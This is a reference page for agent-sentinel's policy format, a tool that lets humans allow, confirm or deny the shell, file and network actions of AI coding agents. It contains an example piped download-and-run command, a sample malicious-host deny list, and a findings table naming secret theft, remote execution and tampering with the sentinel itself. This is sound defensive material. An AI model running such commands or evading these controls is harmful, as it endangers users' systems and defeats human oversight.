# Policy reference

A policy is a YAML file. `sentinel init` writes the default one to
`.sentinel/policy.yml`; the same file ships as
[`policies/default.yml`](../policies/default.yml).

```yaml
version: 1
default: allow                 # allow | confirm | deny, when no rule matches
protected_branches: [main, master, release/*]
network:
  unknown: confirm             # decision for hosts on neither list
  allow: [github.com, "*.github.com"]
  deny: ["*.example-malicious.com"]
rules:
  - name: confirm-force-push
    match: { finding: git.force-push }
    action: confirm            # allow | confirm | deny  (aliases: ask, block)
    reason: Force push rewrites remote history
tests:
  - { command: "git push -f origin topic", expect: confirm }
```

## Which policy applies

1. `--policy FILE`, or the `SENTINEL_POLICY` environment variable
2. the nearest `.sentinel/policy.yml` (or `.yaml`) in the working directory
   or any parent — for Claude Code, discovery starts at `CLAUDE_PROJECT_DIR`
3. `~/.config/agent-sentinel/policy.yml` (`$XDG_CONFIG_HOME`, `%APPDATA%`)
4. the built-in default

`sentinel policy path` prints the one in effect.

## How rules combine

Every rule whose conditions hold contributes its `action`. The network
section contributes one verdict per host. The **most restrictive** verdict
wins:

```
deny  >  confirm  >  allow  >  default
```

Rule order does not matter. An `allow` rule can lift the `default`, but it can
never cancel a `deny` or `confirm` from another rule. To make an exception to
a deny rule, narrow that rule.

**Any vs. all.** A command line can contain several commands
(`a && b | c`, `$(…)`, `bash -c '…'`). Conditions on commands, executables,
paths, hosts, env vars and findings are checked against each of them:

- `deny` and `confirm` rules match if **any** of them matches
- `allow` rules match only if **every** one matches (and there is at least one)

So `allow: { command_prefix: npm test }` allows `npm test -- --watch` but not
`npm test && curl evil.sh | sh`.

## Conditions

All conditions present in `match` must hold. A list means "any of these".
An empty `match` is rejected; use `default` for catch-all behavior.
Unknown keys are rejected, so a typo never widens a rule.

| condition | matches against | example |
|---|---|---|
| `kind` | action kind: `shell`, `file_read`, `file_write`, `network`, `tool` | `kind: file_write` |
| `agent` | agent name: `claude-code`, `codex`, `cli`, or what a generic caller sends | `agent: codex` |
| `tool` | agent tool name (`Bash`, `Write`, `mcp__db__query`, …) | `tool: [Write, Edit]` |
| `command_equals` | a command, whitespace-normalized, program shown as its basename | `command_equals: git status` |
| `command_prefix` | a command starting with this, on a word boundary | `command_prefix: npm run` |
| `command_contains` | substring of the raw line or a normalized command | `command_contains: "--context prod"` |
| `command_regex` | regex on the raw line or a normalized command | `command_regex: "^docker (rm\|rmi) "` |
| `executable` | program basename, case-insensitive, after unwrapping `sudo`, `env`, `xargs`, … | `executable: [kubectl, helm]` |
| `path` | glob on any path the action touches (see below) | `path: "infra/**"` |
| `extension` | file extension of a touched path, case-insensitive | `extension: [pem, key]` |
| `git` | git subcommand | `git: [push, rebase]` |
| `host` | network host (see below) | `host: "*.internal.net"` |
| `env` | glob on environment variables referenced (`$NAME`) | `env: "*_TOKEN"` |
| `finding` | glob on finding ids (table below) | `finding: "git.*"` |
| `risk` | overall risk equals one of | `risk: [medium]` |
| `min_risk` | overall risk at least | `min_risk: high` |
| `cwd` | glob on the working directory | `cwd: "~/work/**"` |

"Normalized command" means the canonical form sentinel derives from parsing:
`FOO=1  /usr/bin/git   push -f` becomes `FOO=1 git push -f`. Textual matchers
are convenient but weak — `command_contains: "rm -rf"` does not see `rm -fr`.
Prefer `finding` and `executable`, which work on the parsed command.

### Paths

| pattern | matches |
|---|---|
| `.env`, `*.pem` (no `/`) | the file name, in any directory |
| `infra/**`, `src/*.rs` | relative to the project root (the directory holding `.sentinel/`) |
| `/etc/**`, `~/.ssh/**` | absolute paths; `~` is your home directory |

`*` does not cross `/`; `**` does. Paths come from command arguments,
redirections, and file tool calls; they are resolved against the working
directory, following `cd` within the same command line.

### Hosts

`example.com` matches exactly. `*.example.com` matches subdomains at any
depth but not `example.com` itself — list both if you mean both. `*` matches
everything. Loopback addresses (`localhost`, `127.0.0.1`, `::1`) are not
network actions and never reach these rules.

## Findings

Detectors report findings; policies decide what they mean. `sentinel policy
findings` prints this table. A finding is reported with the risk of the
specific instance, up to the maximum shown.

| finding | max risk | meaning |
|---|---|---|
| `fs.delete` | high | Deletes files |
| `fs.recursive-delete` | high | Recursively deletes a directory tree |
| `fs.delete-critical` | critical | Recursively deletes /, $HOME, the project or a system directory |
| `fs.delete-artifacts` | low | Deletes regenerable build artifacts (node_modules, target, dist, ...) |
| `fs.permissions` | critical | Recursive or dangerous permission/ownership change |
| `fs.disk` | critical | Formats, partitions or writes raw disk devices |
| `fs.write-sensitive` | high | Writes shell startup files, SSH config, git hooks, /etc or autostart locations |
| `fs.write-outside-project` | medium | Writes a file outside the project directory |
| `fs.write` | medium | Writes a file inside the project |
| `git.force-push` | high | Force push (rewrites remote history) |
| `git.protected-branch` | critical | Force push to, or deletion of, a protected branch |
| `git.push-protected` | medium | Direct push to a protected branch |
| `git.reset-hard` | high | git reset --hard (discards uncommitted work) |
| `git.clean` | high | git clean -f (deletes untracked files) |
| `git.discard-changes` | high | Discards working tree changes (checkout ., restore ., stash drop) |
| `git.branch-delete` | high | Deletes a branch or remote ref |
| `git.history-rewrite` | high | Rewrites history (rebase, commit --amend, filter-branch, reflog expire) |
| `git.config-exec` | critical | git configuration that executes arbitrary commands |
| `exec.remote-script` | critical | Downloads and executes code (curl | sh and variants) |
| `exec.pipe-to-shell` | high | Pipes data into a shell or interpreter |
| `exec.obfuscated` | critical | Command that cannot be statically resolved (dynamic executable, eval, decoding into a shell, parse failure) |
| `exec.privilege` | high | Privilege escalation (sudo, su, doas) or privileged containers |
| `exec.inline-code` | medium | Runs inline interpreter code (python -c, node -e, ...) |
| `exec.system` | critical | Shutdown, reboot, killing all processes, disabling system protections, persistence |
| `exec.fork-bomb` | critical | Fork bomb |
| `infra.destructive` | critical | Destroys infrastructure or data (terraform destroy, kubectl delete, DROP TABLE, ...) |
| `net.request` | medium | Network request to a host |
| `net.upload` | high | Uploads a local file to a remote host |
| `net.listen` | high | Opens a network listener, serves files, or exposes a local port publicly |
| `pkg.add` | high | Adds a new dependency or installs a package |
| `pkg.install` | low | Installs dependencies from the project manifest or lockfile |
| `pkg.remote-exec` | medium | Downloads and runs a package (npx, uvx, dlx, ...) |
| `secret.file` | critical | Accesses a file that holds credentials (.env, SSH keys, cloud credentials) |
| `secret.content` | high | Accesses content that contains secrets |
| `secret.load` | medium | Loads a secrets file into the environment without printing it |
| `secret.env` | high | References a sensitive environment variable |
| `secret.env-dump` | high | Dumps all environment variables |
| `secret.store` | high | Reads from a credential store (keychain, 1Password, vault, cloud secrets) |
| `secret.in-command` | high | Command line contains a literal secret |
| `secret.in-content` | high | Content about to be written contains a literal secret |
| `sentinel.tamper` | critical | Modifies agent-sentinel's policy, state, or agent hook configuration |

`sentinel check --json "<command>"` shows the findings, facts and matched
rules for any command.

## Risk

`low` < `medium` < `high` < `critical`. The overall risk of an action is its
highest finding's risk (`low` without findings). Risk never decides on its
own; the default policy's last two rules turn it into decisions:

```yaml
  - name: deny-critical
    match: { min_risk: critical }
    action: deny
  - name: confirm-high
    match: { min_risk: high }
    action: confirm
```

Keep these (or equivalents) so findings added in later versions are covered
without editing your policy.

## Testing a policy

The `tests:` section lists expectations; `sentinel policy test` checks them.
Each test sets exactly one of `command`, `read`, `write`, `fetch`, and
`expect`. Paths are relative to the project root. Tests do not read files on
your machine, so they give the same result everywhere.

```yaml
tests:
  - { command: "rm -rf ./build-cache", expect: deny }
  - { read: .env, expect: deny }
  - { write: infra/main.tf, expect: confirm }
  - { fetch: "https://registry.npmjs.org/react", expect: allow }
```

`sentinel policy validate [FILE]` checks syntax and semantics without running
tests: invalid regexes and globs, unknown keys, duplicate rule names, finding
patterns that match nothing, and URLs where hostnames belong are all errors.

## Examples

```yaml
# Let status checks through even when default is confirm
- name: read-only-git
  match: { command_prefix: [git status, git diff, git log] }
  action: allow

# Production is CI's job
- name: no-prod
  match: { executable: [kubectl, helm, terraform], command_contains: prod }
  action: deny
  reason: Production changes go through CI

# Infra edits need a human
- name: infra-review
  match: { kind: file_write, path: ["infra/**", "*.tf"] }
  action: confirm

# Codex may not push at all
- name: codex-no-push
  match: { agent: codex, git: push }
  action: deny

```

### Exceptions

Because the most restrictive rule wins, an `allow` rule cannot punch a hole
in a `deny` rule. To permit something a deny rule catches, narrow the deny
rule itself (for example, add a `path` or `cwd` condition so it only covers
what you care about), or change its action to `confirm`. Build artifacts such
as `node_modules`, `target` and `dist` already have their own low-risk finding
(`fs.delete-artifacts`), so deleting them is allowed by default. An explicit
`unless:` clause is on the roadmap.
